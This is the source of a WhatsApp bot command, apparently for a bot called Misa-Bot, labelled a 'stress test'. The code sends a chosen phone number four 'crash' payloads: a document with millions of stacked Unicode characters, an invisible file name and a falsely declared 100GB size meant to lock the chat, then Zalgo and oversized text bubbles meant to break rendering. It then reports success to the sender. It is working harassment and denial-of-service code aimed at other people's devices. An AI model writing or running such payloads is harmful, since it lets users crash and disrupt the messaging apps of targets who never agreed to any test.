/* * 👑 CATACLYSM STRESS TEST - Misa-Bot
 * Ejecuta una ráfaga de 4 ataques de carga para pruebas de hardware.
 * Uso: unicode 54911xxxx
 * Autor: Yanniel & Gemini
 */

const cataclysmBug = {
    name: 'unicode',
    alias: ['heavy', 'crash', 'overload'],
    category: 'utilidades',
    noPrefix: true,

    run: async (conn, m, { args, usedPrefix, command }) => {
        const chat = m.key.remoteJid
        if (!args[0]) return conn.sendMessage(chat, { text: `⚠️ *Uso:* ${usedPrefix + command} [número]` }, { quoted: m })

        try {
            let targetNum = args[0].replace(/[^0-9]/g, '')
            let targetJid = targetNum + '@s.whatsapp.net'
            await conn.sendMessage(chat, { react: { text: '🌀', key: m.key } })

            // --- CONFIGURACIÓN DE CARGA ---
            const cantUnicodes = 500000 
            let cargaDensa = ""
            for (let i = 0; i < cantUnicodes; i++) {
                // Combinación de planos superiores y diacríticos masivos
                cargaDensa += String.fromCodePoint(0x12000 + (i % 800)) // Cuneiforme
                cargaDensa += String.fromCodePoint(0x0345) + String.fromCodePoint(0x0361) // Doble apilado
            }
            const buffer = Buffer.from(cargaDensa, 'utf-16le')
            const invisibleName = String.fromCodePoint(0x200C, 0x200C, 0x200C) + ".txt"

            // --- FASE 1: ARCHIVO BUG (100GB + NOMBRE INVISIBLE) ---
            // Esto bloquea la entrada al chat porque el sistema intenta leer el metadato gigante.
            await conn.sendMessage(targetJid, {
                document: buffer,
                mimetype: 'text/plain',
                fileName: invisibleName,
                fileLength: 107374182400, 
                caption: null
            })

            // --- FASE 2: TEXTO "ZALGO" SUELTO ---
            // 2,000 caracteres de texto estirado verticalmente para colapsar el scroll.
            let zalgoTexto = ""
            for (let i = 0; i < 2000; i++) {
                zalgoTexto += "MISA" + String.fromCodePoint(0x0300 + (i % 50)).repeat(5)
            }
            await conn.sendMessage(targetJid, { text: zalgoTexto })

            // --- FASE 3: MENSAJE CON TÍTULO UNICODE PESADO ---
            // Usamos caracteres matemáticos en negrita para forzar el render de la burbuja.
            let tituloBug = String.fromCodePoint(0x1D400 + (Math.random() * 20)).repeat(50)
            await conn.sendMessage(targetJid, { 
                text: `*${tituloBug}*\n\n` + cargaDensa.substring(0, 1000) 
            })

            // --- FASE 4: BURBUJA DE AUDIO INFINITO (OPCIONAL/SIMULADO) ---
            // Envía un texto tan largo que la burbuja se estira más allá de los límites del render.
            await conn.sendMessage(targetJid, { text: cargaDensa.substring(0, 5000) })

            // Feedback para el administrador
            await conn.sendMessage(chat, { text: `💀 *Cataclismo enviado a @${targetNum}*\n> 4 fases completadas.`, mentions: [targetJid] }, { quoted: m })

        } catch (err) {
            console.error(err)
        }
    }
}

export default cataclysmBug
